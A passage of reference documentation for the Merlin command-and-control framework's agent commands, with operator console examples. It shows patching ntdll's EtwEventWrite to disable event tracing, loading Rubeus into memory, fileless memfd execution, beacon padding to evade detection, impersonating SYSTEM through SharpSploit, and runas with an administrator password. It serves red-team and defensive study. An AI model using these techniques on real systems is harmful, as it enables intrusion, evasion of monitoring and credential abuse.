    [+] john      132905  0.3  0.6 890376 50268 ?        Sl   07:41   0:00 gnome-calculator

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill 132905
    [-] Created job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Successfully killed pid 132905

.. _killdate:

killdate
--------

Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.

Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.

The Killdate can also be set or changed for running agents using the ``set killdate`` command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. http://unixtimestamp.50x.eu/ can be used to generate a UNIX timestamp.

A UNIX timestamp of `0` will read like `1970-01-01T00:00:00Z` in the agent info table.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate 811123200
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

list-assemblies
---------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``list-assemblies`` command lists .NET assemblies that have been loaded into the agent's process with the load-assembly_ command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
    [-] Created job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Loaded Assemblies:
    seatbelt.exe
    rubeus.exe
    sharpdpapi.exe
    sharpup.exe
    Hagrid

load-assembly
-------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``load-assembly`` command loads a .NET assembly into the agent's process. Once the assembly is loaded, it can be executed
multiple times with the invoke-assembly_ command. The .NET assembly is only sent across the wire one time.
An option third argument can be provided to reference the assembly as any other name when executed with the
invoke-assembly_ command.

.. note::
    Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe
    [-] Created job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] successfully loaded rubeus.exe into the default AppDomain

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe Hagrid
    [-] Created job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] successfully loaded Hagrid into the default AppDomain

.. _ls:

ls
--

The ``ls`` command is used to list a directory's contents using native Go functions within Merlin. This command will not execute the ``ls`` or ``dir`` binary programs found on their associated host operating systems. If a directory is not specified, Merlin will list the contents of the current working directory. When specifying a Windows path, you must escape the backslash (e.g.,. `C:\\Temp`). Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without quotes by escaping the space (e.g.,. ``/root/some\ folder/``). Relative paths can be used (e.g.,. ``./../`` or ``downloads\\Merlin``) and they are resolved to their absolute path.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls /var
    [-]Created job eNJKIiLXXH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job eNJKIiLXXH
    Directory listing for: /var

    drwxr-xr-x      2019-02-06 00:05:17     4096    backups
    drwxr-xr-x      2018-12-24 14:40:14     4096    cache
    dgtrwxrwxrwx    2019-02-06 00:05:16     4096    crash
    drwxr-xr-x      2019-01-17 21:24:30     4096    lib
    dgrwxrwxr-x     2018-04-24 04:34:22     4096    local
    Lrwxrwxrwx      2018-11-07 21:33:01     9       lock
    drwxrwxr-x      2019-02-06 00:05:39     4096    log
    dgrwxrwxr-x     2018-07-24 23:03:56     4096    mail
    dgtrwxrwxrwx    2018-07-24 23:09:50     4096    metrics
    drwxr-xr-x      2018-07-24 23:03:56     4096    opt
    Lrwxrwxrwx      2018-11-07 21:33:01     4       run
    drwxr-xr-x      2018-11-07 21:45:43     4096    snap
    drwxr-xr-x      2018-11-07 21:38:04     4096    spool
    dtrwxrwxrwx     2019-02-06 00:05:38     4096    tmp

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls "C:\\Program Files (x86)\\"
    [-]Created job ggQPFQhTrC for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job ggQPFQhTrC
    Directory listing for: C:\Program Files (x86)

    drwxrwxrwx      2018-09-15 00:42:33     0       Common Files
    drwxrwxrwx      2018-09-15 02:08:27     0       Internet Explorer
    drwxrwxrwx      2018-09-15 00:33:50     0       Microsoft.NET
    drwxrwxrwx      2018-09-15 02:07:46     0       Windows Defender
    drwxrwxrwx      2018-12-27 12:42:42     0       Windows Kits
    drwxrwxrwx      2018-09-15 00:33:53     0       Windows Mail
    drwxrwxrwx      2018-12-16 13:15:58     0       Windows Media Player
    drwxrwxrwx      2018-09-15 02:10:06     0       Windows Multimedia Platform
    drwxrwxrwx      2019-01-10 08:18:11     0       Windows Photo Viewer
    drwxrwxrwx      2018-09-15 02:10:06     0       Windows Portable Devices
    drwxrwxrwx      2018-09-15 00:33:50     0       Windows Sidebar
    drwxrwxrwx      2018-09-15 00:33:50     0       WindowsPowerShell
    -rw-rw-rw-      2018-09-15 00:31:34     174     desktop.ini
    drwxrwxrwx      2018-09-15 00:42:33     0       windows nt

main
----

The ``main`` command is used to leave the Agent menu and return back to the :doc:`main`. It is an alias for the ``back`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» main
    Merlin»

.. _maxretry:

maxretry
--------

The ``maxretry`` control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry 50
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

memfd
-----

.. note::
    This command is only available to agent running on a ``Linux`` operating system!

The ``memfd`` command loads a Linux executable file into memory (RAM) as an anonymous file using the
`memfd_create <https://man7.org/linux/man-pages/man2/memfd_create.2.html>`__ API call, executes it, and returns the
results.
The file is created with an empty string as its name.
Less the fact that RAM is a file on Linux, the executable is not written to disk.
View the `Detecting Linux memfd_create() Fileless Malware with Command Line Forensics
<https://www.sandflysecurity.com/blog/detecting-linux-memfd_create-fileless-malware-with-command-line-forensics/>`__
for detection guidance.

.. note::
    This command will not run on Windows agents

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd /tmp/hello.py
    [-] Created job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Hello from a Python script

memory
------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``memory`` command is used to interact with the agent's virtual memory through the following methods:

    * patch_
    * read_
    * write_

Uses direct syscalls for ``NtReadVirtualMemory``, ``NtProtectVirtualMemory``, & ``ZwWriteVirtualMemory`` implemented
using `BananaPhone <https://github.com/C-Sto/BananaPhone>`__

.. _patch:

patch
^^^^^

The ``patch`` command locates the address of the provided procedure/function, reads the existing bytes, and the
overwrites them with the provided bytes. A second read is performed to validate the write event. The command would be
the same as calling the ``read`` and ``write`` commands individually.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory patch ntdll.dll EtwEventWrite 9090C3
    [-] Created job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Read  3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC
    Wrote 3 bytes to   ntdll.dll!EtwEventWrite: 9090C3
    Read  3 bytes from ntdll.dll!EtwEventWrite: 9090C3

.. _read:

read
^^^^

The ``read`` command locates the address of the provided procedure/function and reads the specified number of bytes.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory read ntdll.dll EtwEventWrite 3
    [-] Created job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Read 3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC

.. _write:

write
^^^^^

The ``write`` command locates teh address of the provided procedure/function and writes the specified bytes.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory write ntdll.dll EtwEventWrite 9090C3
    [-] Created job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Wrote 3 bytes to ntdll.dll!EtwEventWrite: 9090C3


netstat
-------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``netstat`` command uses the Windows API to enumerating network connections and listening ports.
Without any arguments, the ``netstat`` command returns all TCP and UDP network connections.

Use ``netstat -p tcp`` to only return TCP connections and ``netstat -p udp`` to only return UDP connections.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
    [-] Created job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Proto Local Addr              Foreign Addr            State        PID/Program name
    udp   0.0.0.0:123             0.0.0.0:0                            3272/svchost.exe
    udp   0.0.0.0:500             0.0.0.0:0                            3104/svchost.exe
    udp   0.0.0.0:3389            0.0.0.0:0                            984/svchost.exe
    udp6  :::123                  0.0.0.0:0                            3272/svchost.exe
    udp6  :::500                  0.0.0.0:0                            3104/svchost.exe
    udp6  :::3389                 0.0.0.0:0                            984/svchost.exe
    tcp   0.0.0.0:135             0.0.0.0:0               LISTEN       964/svchost.exe
    tcp   0.0.0.0:445             0.0.0.0:0               LISTEN       4/System
    tcp   0.0.0.0:3389            0.0.0.0:0               LISTEN       984/svchost.exe
    tcp   127.0.0.1:52945         127.0.0.1:5357          TIME_WAIT
    tcp   127.0.0.1:54441         127.0.0.1:5357          TIME_WAIT
    tcp   192.168.1.11:59757      72.21.91.29:80          CLOSE_WAIT   6496/SearchApp.exe
    tcp   192.168.1.11:59763      72.21.91.29:80          CLOSE_WAIT   12076/YourPhone.exe
    tcp6  :::135                  :::0                    LISTEN       964/svchost.exe
    tcp6  :::445                  :::0                    LISTEN       4/System
    tcp6  :::3389                 :::0                    LISTEN       984/svchost.exe

note
----

The ``note`` command creates a server-side note that operators can use to record miscellaneous information about an agent.
The note is displayed in a column of the output from the sessions_ command

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note Demo Agent Here
    [i] Agent c1090dbc-f2f7-4d90-a241-86e0c0217786's note set to: Demo Agent Here
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sessions

                   AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
    +--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
      c1090dbc-f2f7-4d90-a241-86e0c0217786 | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here


nslookup
--------

The ``nslookup`` command takes a space separated list of IP addresses or hostnames and performs a DNS query using the
host's resolver and returns the results.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup 8.8.8.8 9.9.9.9 github.com google.com
    [-] Created job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Query: 8.8.8.8, Result: dns.google.
    Query: 9.9.9.9, Result: dns9.quad9.net.
    Query: github.com, Result: 192.30.255.113
    Query: google.com, Result: 142.250.73.238 2607:f8b0:4004:82a::200e

.. _padding:

padding
-------

The ``padding`` control type is used to change the _maximum_ size of a message's padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

pipes
-----

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``pipes`` command lists all of the named pipes on the Windows host where the agent is currently running:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
    [-] Created job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Named pipes:
    \\.\pipe\InitShutdown
    \\.\pipe\lsass
    \\.\pipe\ntsvcs
    \\.\pipe\scerpc
    \\.\pipe\Winsock2\CatalogChangeListener-2f4-0
    \\.\pipe\Winsock2\CatalogChangeListener-3c4-0
    \\.\pipe\epmapper
    \\.\pipe\Winsock2\CatalogChangeListener-254-0
    \\.\pipe\LSM_API_service
    \\.\pipe\Winsock2\CatalogChangeListener-3f8-0
    \\.\pipe\eventlog
    \\.\pipe\Winsock2\CatalogChangeListener-558-0
    \\.\pipe\TermSrv_API_service
    \\.\pipe\Ctx_WinStation_API_service
    \\.\pipe\atsvc
    \\.\pipe\Winsock2\CatalogChangeListener-734-0
    \\.\pipe\wkssvc
    \\.\pipe\SessEnvPublicRpc
    \\.\pipe\Winsock2\CatalogChangeListener-a1c-0
    \\.\pipe\spoolss
    \\.\pipe\Winsock2\CatalogChangeListener-adc-0
    \\.\pipe\trkwks


printenv
--------

The ``printenv`` command is an alias for the ``env`` showall_ command that enumerates and return all environment variables:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
    [-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Environment variables:
    SHELL=/bin/bash
    SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
    QT_ACCESSIBILITY=1
    SNAP_REVISION=148
    XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
    XDG_MENU_PREFIX=gnome-
    GNOME_DESKTOP_SESSION_ID=this-is-deprecated
    SNAP_REAL_HOME=/home/rastley
    GNOME_SHELL_SESSION_MODE=ubuntu
    SSH_AUTH_SOCK=/run/user/1000/keyring/ssh

.. _ps:

ps
--

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``ps`` command uses the Windows API to gather available information about running processes.
The agent is not running in a high-integrity process then some of the information will be missing.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]]» ps
    [-] Created job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]

    [-] Results job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]

    [+]
    PID     PPID    ARCH    OWNER   EXE
    0       0       x64             [System Process]
    4       0       x64             System
    124     4       x64             Registry
    412     4       x64             smss.exe
    508     496     x64             csrss.exe
    596     496     x64             wininit.exe
    604     588     x64             csrss.exe
    668     588     x64     BUILTIN\Administrators  winlogon.exe
    736     596     x64             services.exe
    <SNIP>
    4648    2504    x64     DESKTOP-H39FR21\bob     sihost.exe
    5732    736     x64     DESKTOP-H39FR21\bob     svchost.exe
    5684    736     x64     DESKTOP-H39FR21\bob     svchost.exe
    5768    1844    x64     DESKTOP-H39FR21\bob     taskhostw.exe
    5716    736     x64     BUILTIN\Administrators  svchost.exe
    2396    736     x64     NT AUTHORITY\SYSTEM     svchost.exe
    6220    2396    x64     DESKTOP-H39FR21\bob     ctfmon.exe
    6464    736     x64     NT AUTHORITY\LOCAL SERVICE      svchost.exe
    6504    6376    x64     DESKTOP-H39FR21\bob     explorer.exe

pwd
---

The ``pwd`` command uses native Go to get and return the current working directory.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
    [-]Created job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Current working directory: C:\Users\Joe

quit
----

The ``quit`` command is used to exit out of the Merlin Server application. This is also an alias for the ``exit`` command.

.. _rm:

rm
--

The ``rm`` command will remove or delete a file using native Go functions.

`` rm <file path>``

.. code-block:: text

    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» rm C:\\Users\\rastley\\Downloads\\lyrics.txt
    [-] Created job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

    [-] Results job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

    [+] successfully removed file C:\Users\rastley\Downloads\lyrics.txt

runas
-----

The ``runas`` command will run a program as another user. This is done using the `CreateProcessWithLogonW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw>`__ Windows API call.

``runas <Domain\\User> <Password> <program> [<program args>]``

.. code-block:: text

    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» runas ACME\\Administrator S3cretPassw0rd cmd.exe /c dir \\\\DC01.ACME.COM\\C$
    [-] Created job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

    [-] Results job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

    [+] Created cmd.exe process with PID 2120

.. _run:

run
---

The ``run`` command is used to task the agent to run a program on the host and return STDOUT/STDERR. When issuing a command to an agent from
the server, the agent will execute the provided binary file for the program you specified and also pass along any
arguments you provide. It is important to note that program must be in the path. This allows an operator to specify and
use a shell (e.g.,. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly *WITHOUT* a shell.
For instance, ``ping.exe`` is typically in the host's %PATH% variable on Windows and works *without* specifying ``cmd.exe``.
However, the ``ver`` command is not an executable in the %PATH% and therefore *must* be run from ``cmd.exe``.
Use the shell_ command if you want to use the operating system's default shell directly.

Example using ping:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ping 8.8.8.8
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job DTBnkIfnus for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job DTBnkIfnus

    Pinging 8.8.8.8 with 32 bytes of data:
    Reply from 8.8.8.8: bytes=32 time=23ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=368ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=26ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=171ms TTL=54

    Ping statistics for 8.8.8.8:
        Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
    Approximate round trip times in milli-seconds:
        Minimum = 23ms, Maximum = 368ms, Average = 147ms

Example running ``ver`` *without* ``cmd.exe``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job iOMPERNYGT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job iOMPERNYGT
    exec: "ver": executable file not found in %PATH%

Example running ``ver`` *with* ``cmd.exe``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job IxVXgyIkhS

    Microsoft Windows [Version 10.0.16299.64]

Shell Functions
^^^^^^^^^^^^^^^

Some commands and capabilities are components of a shell and can *ONLY* be used with a shell.
For example, the ``dir`` command is a component of ``cmd.exe`` and is not its own program executable.
Therefore, ``dir`` can only be used within the ``cmd.exe`` shell.
In order to use the `dir`, you must provide executable of the shell environment where that command resides.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir

The pipe and redirection characters ``|`` , ``>`` , and ``<`` , are also functions of a shell environment.
If you want to use them, you must do so *WITH* a shell.
For Linux, an example would be:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»run bash -c "cat /etc/passwd | grep root"

Quoted Arguments
^^^^^^^^^^^^^^^^

When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., ``\`` , ``&`` , ``;`` , ``|`` , ``>`` , ``<`` etc.) the command will be processed fine.

For example, this command will work fine because it does not have any special characters:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM

However, this command **WILL** fail because of the ``|`` symbol. The command will still execute, but will stop processing everything after the ``|`` symbol.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM | fl

To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. Any inner quotes need to be escaped. The argument can be enclosed in double quotes or single quotes.
The command be executed in both of these ways:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe "Get-Service -Name win* -Exclude WinRM | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe "Get-Service -Name \"win*\" -Exclude "WinRM" | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe 'Get-Service -Name \'win*\' -Exclude 'WinRM' | fl'

Escape Sequence
^^^^^^^^^^^^^^^

Following along with the Quoted Arguments section above, the ``\`` symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, ``|`` .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.

This command will fail because the ``\`` itself needs to escaped. Notice the error message shows ``C:WindowsSystem32``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c C:\Windows\System32
    [-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
    [+]'C:WindowsSystem32' is not recognized as an internal or external command,
    operable program or batch file.
    [!]exit status 1

To correctly issue the command either escape the ``\`` or enclose the commands in quotes:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir C:\\Windows\\System32

sdelete
-------

The ``sdelete`` command securely deletes a file.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete /tmp/deleteMe.txt
    [-] Created job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Securely deleted file: /tmp/deleteMe.txt

sessions
--------

The ``sessions`` command is used to quickly list information about established agents from the main menu to include their status.
The sessions command is available from any menu in the CLI.

* AGENT GUID - A unique identifier for every running instance
* TRANSPORT - The protocol the agent is communicating over
* PLATFORM - The operating system and architecture the agent is running on
* HOST - The hostname where the agent is running
* USER - The username that hte agent is running as
* PROCESS - The Agent's process name followed by its Process ID (PID) in parenthesis
* STATUS - The Agent's communiction status of either active, delayed, or dead
* LAST CHECKIN - The amount of time that has passed since the agent last checked in
* NOTE - A free-form text area for operators to record notes about a specific agent; tracked server-side only

.. code-block:: text

    Merlin» sessions

                   AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
    +--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
      d07edfda-e119-4be2-a20f-918ab701fa3c | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here

sharpgen
--------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

.. warning::
    The .NET Core 2.1 SDK must be manually installed by the operator and the SharpGen executable must be built before the ``sharpgen`` command can be used

The ``sharpgen`` command leverages Ryan Cobb's `SharpGen <https://github.com/cobbr/SharpGen>`_ project and the `.NET Core 2.1 SDK <https://dotnet.microsoft.com/download/dotnet-core/2.1>`_ to dynamically compile and execute .NET assemblies. After assembly is compiled, the same steps documented in `execute-assembly`_ are followed. SharpGen also leverages functionality from the `SharpSploit <https://github.com/cobbr/SharpSploit>`_ project that can be called directly from this ``shargen`` command. This command uses a hardcoded output that places compiled executables to the Merlin root directory as ``sharpgen.exe``.

For more granular control and additional configuration options, use the ``windows/x64/csharp/misc/SharpGen`` module.

SharpGen is git a submodule in the ``data/src/cobbr/SharpGen`` directory. From this directory, run the ``dotnet build -c release`` command to build the ``SharpGen.dll`` executable.

The ``sharpgen`` command is executed as: ``shaprgen <code> [<spawnto path> <spawnto args>]``

The ``code`` positional argument is the .NET code you want to compile and execute. All code is automatically wraped in ``Console.WriteLine();`` and it does not need to be included again. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Use ``\`` to escape any characters inside of the code argument and use quotes to enclose the entire code argument (e.g., ``"new Tokens().MakeToken(\"RAstley\", \"\", \"P@ssword\")"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen "new SharpSploit.Credentials.Tokens().GetSystem()"
    [-] Created job oeOBXfBuPS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job oeOBXfBuPS

    Getting system...
    Impersonate NT AUTHORITY\SYSTEM...
    Processes for NT AUTHORITY\SYSTEM: 25
    Attempting to impersonate: NT AUTHORITY\SYSTEM
    Attempting to impersonate: NT AUTHORITY\SYSTEM
    Impersonated: NT AUTHORITY\SYSTEM
    True

.. _shell:

shell
-----

The ``shell`` command is used to task the agent to execute the provided arguments using the operating system's default
shell and return STDOUT/STDERR. On Windows the ``%COMSPEC%`` shell is used and if it is ``cmd.exe`` then the ``/c``
argument is used. For macOS and Linux, the ``/bin/sh`` shell is used with the ``-c`` argument.
Use the run_ command to execute a program directly without invoking the shell.

Example using ``ver``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job IxVXgyIkhS

    Microsoft Windows [Version 10.0.16299.64]

Shell Functions
^^^^^^^^^^^^^^^

Some commands and capabilities are components of a shell and can *ONLY* be used with a shell.
For example, the ``dir`` command is a component of ``cmd.exe`` and is not its own program executable.
Therefore, ``dir`` can only be used within the ``cmd.exe`` shell.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir

The pipe and redirection characters ``|`` , ``>`` , and ``<`` , are also functions of a shell environment.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell "cat /etc/passwd | grep root"

Quoted Arguments
^^^^^^^^^^^^^^^^

When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., ``\`` , ``&`` , ``;`` , ``|`` , ``>`` , ``<`` etc.) the command will be processed fine.

For example, this command will work fine because it does not have any special characters:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM

However, this command **WILL** fail because of the ``|`` symbol. The command will still execute, but will stop processing everything after the ``|`` symbol.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM | fl

To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. The argument can be enclosed in double quotes or single quotes. All other quotes need to be escaped
